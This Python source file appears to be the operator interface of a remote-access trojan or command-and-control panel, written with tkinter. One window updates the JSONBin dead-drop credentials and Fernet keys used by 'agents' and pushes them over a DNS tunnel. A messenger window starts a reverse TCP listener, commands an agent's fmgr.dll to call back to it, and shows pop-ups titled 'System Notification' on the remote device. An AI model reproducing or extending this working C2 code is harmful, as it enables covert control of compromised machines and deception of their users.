import tkinter as tk
from tkinter import messagebox, scrolledtext
import json
import os
import time
import socket
import threading
import struct
from core.state import JSON_FOLDER, CONFIG_FILE 

def get_icon_path():

    base_dir = os.environ.get('TAO_BASE_DIR')
    if not base_dir:

        current_file_dir = os.path.dirname(os.path.abspath(__file__))
        base_dir = os.path.abspath(os.path.join(current_file_dir, ".."))
    
    return os.path.join(base_dir, "ico", "ico.ico")

class JSONBinEditorWindow:

    def __init__(self, parent, controller):
        self.controller = controller

        self.window = tk.Toplevel(parent)
        self.window.title("Edit JSONBin Credentials")
        
        icon_path = get_icon_path()
        if os.path.exists(icon_path):
            try:
                self.window.wm_iconbitmap(icon_path)
            except Exception:
                pass      
        
        self.window.geometry("600x310")
        self.window.resizable(False, False)
        self.window.configure(bg="#0D0D0D")
        self.window.protocol("WM_DELETE_WINDOW", self.on_close)
        self.window.transient(parent)
        self.window.grab_set()

        self.config = self.controller.lc()

        self._build_ui()

    def _build_ui(self):
        header = tk.Frame(self.window, bg="#2C1E1E", height=20)
        header.pack(fill="x")
        header.pack_propagate(False)

        content = tk.Frame(self.window, bg="#1A1212")
        content.pack(fill="both", expand=True, padx=10, pady=10)

        self._create_field(content, "BIN ID:", self.config.get("BIN_ID", ""))

        self._create_field(content, "API Key:", self.config.get("API_KEY", ""), show="*")

        self._create_field(content, "URL:", self.config.get("URL", ""))

        self._create_field(content, "Fernet Key:", self.config.get("FERNET_KEY", ""), show="*")

        info_frame = tk.Frame(content, bg="#2C1E1E", relief="groove", borderwidth=2)
        info_frame.pack(fill="x", pady=10)

        info_text = (
            "NOTICE:\n"
            "• Changes affect all agents using these credentials\n"
            "• TUNNEL Mode agents must switch to HTTP first\n"
            "• Fernet key change will trigger agent re-encryption"
        )

        tk.Label(info_frame, text=info_text, 
                bg="#2C1E1E", fg="#888888",
                font=("Arial", 9), justify="left").pack(padx=5, pady=5)

        btn_frame = tk.Frame(self.window, bg="#0D0D0D")
        btn_frame.pack(fill="x", padx=10, pady=(5, 10))

        tk.Button(btn_frame, text="Save Changes",
                 command=self.save_changes,
                 bg="#4CAF50", fg="white", font=("Arial", 10, "bold"),
                 padx=20, pady=8).pack(side="left", padx=5)

        tk.Button(btn_frame, text="Cancel",
                 command=self.on_close,
                 bg="#666666", fg="white", font=("Arial", 10, "bold"),
                 padx=20, pady=8).pack(side="right", padx=5)

    def _create_field(self, parent, label_text, default_value, show=None):

        frame = tk.Frame(parent, bg="#1A1212")
        frame.pack(fill="x", padx=10, pady=5)

        tk.Label(frame, text=label_text, bg="#1A1212", fg="#F2E9E4",
                font=("Arial", 10), width=12, anchor="w").pack(side="left")

        entry = tk.Entry(frame, bg="#0D0D0D", fg="#00FF00",
                        font=("Consolas", 10), insertbackground="white",
                        show=show)
        entry.insert(0, default_value)
        entry.pack(side="left", fill="x", expand=True, padx=5)

        if "BIN ID" in label_text:
            self.bin_entry = entry
        elif "API Key" in label_text:
            self.api_entry = entry
        elif "URL" in label_text:
            self.url_entry = entry
        elif "Fernet" in label_text:
            self.fernet_entry = entry

        return entry

    def save_changes(self):
        new_bin = self.bin_entry.get().strip()
        new_api = self.api_entry.get().strip()
        new_url = self.url_entry.get().strip()
        new_fernet = self.fernet_entry.get().strip()

        if not new_bin or not new_api or not new_url or not new_fernet:
            messagebox.showerror("Error", "All fields are required")
            return

        old_fernet = self.config.get("FERNET_KEY", "")
        fernet_changed = (new_fernet != old_fernet)

        creds_changed = (
            new_bin != self.config.get("BIN_ID", "") or
            new_api != self.config.get("API_KEY", "") or
            new_url != self.config.get("URL", "")
        )

        if not creds_changed and not fernet_changed:
            messagebox.showinfo("No Changes", "No changes detected")
            self.on_close()
            return

        if self.controller.active_mode == "http":
            warning = (
                "WARNING: Controller is in HTTP mode\n\n"
                "Agents currently in TUNNEL Mode cannot receive this update.\n"
                "They must switch to HTTP mode first.\n\n"
                "Do you want to cancel and switch to TUNNEL Mode?"
            )

            response = messagebox.askyesnocancel(
                "Mode Warning",
                warning,
                icon='warning'
            )

            if response is None: 
                return
            elif response: 
                self.controller._log_m("User cancelled to switch to TUNNEL Mode first")
                self.on_close()
                return

        if self.controller.active_mode == "dns":
            if not self.controller.dns_mode.current_agent_id:
                messagebox.showerror("Error", "No agent connected via DNS")
                return

            confirm = messagebox.askyesno(
                "Confirm Update",
                f"Send updated credentials to agent?\n\n"
                f"Agent: {self.controller.dns_mode.current_agent_id}\n"
                f"Fernet key changed: {'Yes' if fernet_changed else 'No'}"
            )

            if not confirm:
                return

            if creds_changed:
                self.controller._log_m("Updating JSONBin credentials on agent...")

                creds = {
                    "bin_id": new_bin,
                    "api_key": new_api,
                    "url": new_url
                }

                creds_json = json.dumps(creds, separators=(',', ':'))
                cmd = f"cmd--update-jsonbin {creds_json}"

                if not self.controller.dns_mode.dns_cmd(cmd):
                    messagebox.showerror("Error", "Failed to send credentials update")
                    return

                self.controller._log_m("SYS: JSONBin credentials sent")
                time.sleep(2)  

            if fernet_changed:
                self.controller._log_m(f"Updating Fernet key on agent...")

                fernet_cmd = f"cmd--fernet {new_fernet}"

                if not self.controller.dns_mode.dns_cmd(fernet_cmd):
                    messagebox.showerror("Error", "Failed to send Fernet key update")
                    return

                self.controller._log_m("SYS: Fernet key update sent")
                time.sleep(2)  

        self.controller._log_m("Saving to local config.json...")

        self.config["BIN_ID"] = new_bin
        self.config["API_KEY"] = new_api
        self.config["URL"] = new_url
        self.config["FERNET_KEY"] = new_fernet

        try:
            os.makedirs(JSON_FOLDER, exist_ok=True)
            with open(CONFIG_FILE, 'w') as f:
                json.dump(self.config, f, indent=4)

            self.controller.bin_id_entry.delete(0, tk.END)
            self.controller.bin_id_entry.insert(0, new_bin)

            self.controller.api_key_entry.delete(0, tk.END)
            self.controller.api_key_entry.insert(0, new_api)

            self.controller.url_entry.delete(0, tk.END)
            self.controller.url_entry.insert(0, new_url)

            if hasattr(self.controller, 'fernet_entry'):
                self.controller.fernet_entry.delete(0, tk.END)
                self.controller.fernet_entry.insert(0, new_fernet)

            self.controller._log_m("SYS: Credentials saved to config.json")

            if self.controller.active_mode == "dns":
                messagebox.showinfo(
                    "Success",
                    "Credentials updated successfully!\n\n"
                    "SYS: Agent updated\n"
                    "SYS: Local config saved"
                )
            else:
                messagebox.showinfo(
                    "Success",
                    "Credentials saved to config.json\n\n"
                    "Note: Agents in TUNNEL Mode will not receive this update"
                )

            self.on_close()

        except Exception as e:
            self.controller._log_m(f"ERROR saving config: {e}")
            messagebox.showerror("Error", f"Failed to save config:\n{e}")

    def on_close(self):

        self.window.destroy()

class MessageDialogWindow:

    FM_HEARTBEAT     = 0x01
    FM_HEARTBEAT_ACK = 0x02
    FM_COMMAND       = 0x03
    FM_RESPONSE      = 0x04
    FM_MESSAGE       = 0x09

    def __init__(self, parent, controller):
        self.controller = controller
        self.window = tk.Toplevel(parent)
        self.window.title("Messenger")
        
        icon_path = get_icon_path()
        if os.path.exists(icon_path):
            try:
                self.window.wm_iconbitmap(icon_path)
            except Exception:
                pass 
        
        self.window.geometry("500x400")
        self.window.resizable(False, False)
        self.window.configure(bg="#1A1212")
        self.window.protocol("WM_DELETE_WINDOW", self.on_close)
        self.window.transient(parent)
        self.window.grab_set()

        self.socket = None
        self.connected = False
        self.session_active = False
        self.last_heartbeat = time.time()
        self.heartbeat_thread = None
        self.receive_thread = None

        if self.controller.active_mode == "dns":
            agent_info = self.controller.dns_mode.dns_server.agents.get(
                self.controller.dns_mode.current_agent_id
            ) if self.controller.dns_mode.current_agent_id else None
            self.agent_ip = agent_info.get('ip') if agent_info else None
        else:
            data = getattr(self.controller, 'selected_agent_data', None)
            self.agent_ip = data.get('device_ip') if data else None

        self._build_ui()

        if self.agent_ip:
            self._safe_after(500, self.connect_to_agent)
        else:
            self.controller._log_m("ERROR: Could not determine agent IP")
            self.status_label.config(text="SYS: No Agent IP", fg="#FF4444")

    def _window_alive(self) -> bool:

        try:
            return bool(self.window.winfo_exists())
        except Exception:
            return False

    def _safe_after(self, delay, func, *args):

        if not self._window_alive():
            return
        def _guarded():
            if self._window_alive():
                func(*args)
        self.window.after(delay, _guarded)

    def _build_ui(self):
        header = tk.Frame(self.window, bg="#2C1E1E", height=30)
        header.pack(fill="x", padx=5, pady=5)
        header.pack_propagate(False)

        self.status_label = tk.Label(header, text="STATUS: Connecting...",
                                     bg="#2C1E1E", fg="#FFA500",
                                     font=("Consolas", 9))
        self.status_label.pack(side="left", padx=5)

        title_frame = tk.Frame(self.window, bg="#1A1212")
        title_frame.pack(fill="x", padx=5, pady=5)

        tk.Label(title_frame, text="Window Title:", bg="#1A1212", fg="#F2E9E4",
                 font=("Arial", 10)).pack(anchor="w")

        self.title_entry = tk.Entry(title_frame, bg="#0D0D0D", fg="#00FF00",
                                    font=("Consolas", 10), insertbackground="white")
        self.title_entry.pack(fill="x", pady=5)
        self.title_entry.insert(0, "System Notification")

        msg_frame = tk.Frame(self.window, bg="#1A1212")
        msg_frame.pack(fill="both", expand=True, padx=10, pady=5)

        tk.Label(msg_frame, text="Message:", bg="#1A1212", fg="#F2E9E4",
                 font=("Arial", 10)).pack(anchor="w")

        self.msg_text = scrolledtext.ScrolledText(
            msg_frame,
            bg="#0D0D0D", fg="#00FF00",
            font=("Consolas", 10),
            insertbackground="#00FF00",
            wrap="word", height=8
        )
        self.msg_text.pack(fill="both", expand=True, pady=5)

        btn_frame = tk.Frame(self.window, bg="#1A1212")
        btn_frame.pack(fill="x", padx=10, pady=5)

        tk.Label(btn_frame, text="Button Type:", bg="#1A1212", fg="#F2E9E4",
                 font=("Arial", 10)).pack(anchor="w")

        self.button_var = tk.StringVar(value="OK")
        radio_frame = tk.Frame(btn_frame, bg="#1A1212")
        radio_frame.pack(fill="x", pady=5)

        for text, value in [("OK", "OK"), ("OK | Cancel", "OKCANCEL"), ("Yes | No", "YESNO")]:
            tk.Radiobutton(radio_frame, text=text, variable=self.button_var,
                           value=value, bg="#1A1212", fg="#F2E9E4",
                           selectcolor="#2C1E1E", activebackground="#1A1212",
                           font=("Arial", 9)).pack(side="left", padx=10)

        action_frame = tk.Frame(self.window, bg="#1A1212")
        action_frame.pack(fill="x", padx=10, pady=(5, 10))

        self.send_btn = tk.Button(action_frame, text="Send Message",
                                  command=self.send_message,
                                  bg="#4CAF50", fg="white",
                                  font=("Arial", 10, "bold"),
                                  padx=20, pady=8, state="disabled")
        self.send_btn.pack(side="left", padx=5)

        tk.Button(action_frame, text="Cancel",
                  command=self.on_close,
                  bg="#666666", fg="white",
                  font=("Arial", 10, "bold"),
                  padx=20, pady=8).pack(side="right", padx=5)

    def connect_to_agent(self):

        if self.controller.active_mode == "dns":
            threading.Thread(target=self._connect_outbound, daemon=True).start()
        else:
            self.controller._log_m("MESSAGE: HTTP mode — starting reverse listener...")
            threading.Thread(target=self._connect_reverse, daemon=True).start()

    def _connect_outbound(self):

        self.controller._log_m(f"MESSAGE: Connecting to {self.agent_ip}:8888...")
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.settimeout(10)
            self.socket.connect((self.agent_ip, 8888))
            self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            self.socket.settimeout(5.0)
            self._safe_after(0, self._on_socket_ready)
        except Exception as e:
            self._safe_after(0, lambda: self.status_label.config(
                text="ERROR: Connection Failed", fg="#FF4444"))
            self.controller._log_m(f"MESSAGE: Connection error: {e}")
            self._safe_after(0, lambda: messagebox.showerror(
                "Connection Error", f"Failed to connect:\n{e}"))

    def _connect_reverse(self):

        from tools.reverse_listener import ReverseTCPListener

        port = 9005
        listener = ReverseTCPListener(port=port, timeout=30, log_fn=self.controller._log_m)
        if not listener.start():
            self._safe_after(0, lambda: self.status_label.config(
                text="ERROR: Listener failed", fg="#FF4444"))
            return

        controller_ip = ReverseTCPListener.get_local_ip()
        callback_cmd  = f"exec-fmgr.dll|CALLBACK:{controller_ip}:{port}"
        self.controller._log_m(f"MESSAGE: Sending callback command → {callback_cmd}")
        self.controller._send_http_cmd(callback_cmd)

        self._safe_after(0, lambda: self.status_label.config(
            text=f"SYS: Waiting for agent ({port})...", fg="#FFA500"))

        sock = listener.wait_for_connection()
        if not sock:
            self._safe_after(0, lambda: self.status_label.config(
                text="ERROR: Agent did not call back", fg="#FF4444"))
            self.controller._log_m("MESSAGE: Reverse connection timed out")
            return

        self.socket = sock
        self._safe_after(0, self._on_socket_ready)

    def _on_socket_ready(self):

        self.connected = True
        self.session_active = True
        self.last_heartbeat = time.time()

        self.status_label.config(text="STATUS: Connected", fg="#4CAF50")
        self.send_btn.config(state="normal")
        self.controller._log_m("MESSAGE: Connected to fmgr.dll")

        self.receive_thread = threading.Thread(target=self._receive_loop, daemon=True)
        self.receive_thread.start()

        self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        self.heartbeat_thread.start()

    def send_packet(self, pkt_type, data=""):
        if not self.socket or not self.session_active:
            return False
        try:
            data_bytes = data.encode('utf-8') if isinstance(data, str) else data
            header = struct.pack('!BI', pkt_type, len(data_bytes))
            if self.socket.send(header) != 5:
                return False
            total_sent = 0
            while total_sent < len(data_bytes):
                chunk_sent = self.socket.send(data_bytes[total_sent:])
                if chunk_sent == 0:
                    return False
                total_sent += chunk_sent
            return True
        except Exception as e:
            self.controller._log_m(f"MESSAGE: Send error: {e}")
            return False

    def send_message(self):
        title   = self.title_entry.get().strip()
        message = self.msg_text.get("1.0", "end-1c").strip()
        buttons = self.button_var.get()

        if not title or not message:
            messagebox.showwarning("Missing Information",
                                   "Please fill in both title and message")
            return
        if not self.connected or not self.session_active:
            messagebox.showerror("Not Connected", "Not connected to agent")
            return

        payload = f"{title}|{message}|{buttons}"
        self.controller._log_m(f"MESSAGE: Sending '{title}'...")

        if self.send_packet(self.FM_MESSAGE, payload):
            self.controller._log_m("MESSAGE: Sent successfully")
            messagebox.showinfo("Success", "Message sent to agent device")
        else:
            messagebox.showerror("Error", "Failed to send message")

    def _receive_loop(self):
        self.controller._log_m("MESSAGE: Packet receiver started")
        try:
            while self.session_active and self.socket:
                try:
                    self.socket.settimeout(1.0)
                    first_byte = self.socket.recv(1)
                    if not first_byte:
                        break

                    pkt_type = first_byte[0]

                    if pkt_type == self.FM_HEARTBEAT:
                        timestamp_data = self._recv_exact(4)
                        if timestamp_data:
                            self._handle_heartbeat()
                        continue

                    size_data = self._recv_exact(4)
                    if not size_data:
                        break

                    pkt_size = struct.unpack('!I', size_data)[0]
                    pkt_data = self._recv_exact(pkt_size) if pkt_size > 0 else b""
                    if pkt_size > 0 and not pkt_data:
                        break

                    if pkt_type == self.FM_RESPONSE:
                        data_str = pkt_data.decode('utf-8', errors='ignore')
                        self.controller._log_m(f"MESSAGE: {data_str}")

                except socket.timeout:
                    continue
                except ConnectionResetError:
                    self.controller._log_m("MESSAGE: Connection reset by agent")
                    self.session_active = False
                    break
                except Exception as e:
                    if self.session_active:
                        self.controller._log_m(f"MESSAGE: Receive error: {e}")
                    break
        except Exception as e:
            if self.session_active:
                self.controller._log_m(f"MESSAGE: Receive loop error: {e}")
        finally:
            self.session_active = False
            self.controller._log_m("MESSAGE: Packet receiver ended")

    def _recv_exact(self, num_bytes):
        data = b''
        attempts = 0
        max_attempts = 100
        while len(data) < num_bytes and attempts < max_attempts:
            try:
                chunk = self.socket.recv(num_bytes - len(data))
                if not chunk:
                    return None
                data += chunk
                attempts += 1
            except socket.timeout:
                attempts += 1
                continue
            except Exception:
                return None
        return data if len(data) == num_bytes else None

    def _handle_heartbeat(self):
        self.last_heartbeat = time.time()
        try:
            self.socket.send(struct.pack('!BI', self.FM_HEARTBEAT_ACK, 0))
        except Exception as e:
            self.controller._log_m(f"MESSAGE: Failed to send heartbeat ACK: {e}")

    def _heartbeat_loop(self):
        self.controller._log_m("MESSAGE: Heartbeat monitor started")
        while self.session_active and self.socket:
            time.sleep(3)
            elapsed = time.time() - self.last_heartbeat
            if elapsed > 20:
                self.controller._log_m(f"MESSAGE: Heartbeat timeout ({elapsed:.1f}s)")
                self.session_active = False
                break
        self.controller._log_m("MESSAGE: Heartbeat monitor ended")

    def on_close(self):

        self.controller._log_m("MESSAGE: Closing...")

        self.session_active = False

        if self.socket:
            try:
                self.socket.shutdown(socket.SHUT_RDWR)
                self.socket.close()
            except Exception:
                pass
            self.socket = None

        if self.controller.active_tool_windows.get('message') == self:
            self.controller.active_tool_windows['message'] = None

        fmgr_tools = ['file_manager', 'message']
        still_open = [t for t in fmgr_tools
                      if self.controller.active_tool_windows.get(t) is not None]
        if not still_open:
            self.controller.fmgr_loaded  = False
            self.controller.fmgr_loading = False
            if self.controller.active_mode != "dns":
                self.controller._send_taskkill("fmgr.dll")
            self.controller._log_m("SESSION: All fmgr tools closed — fmgr.dll terminated")

        self.window.destroy()
        self.controller._log_m("MESSAGE: Closed")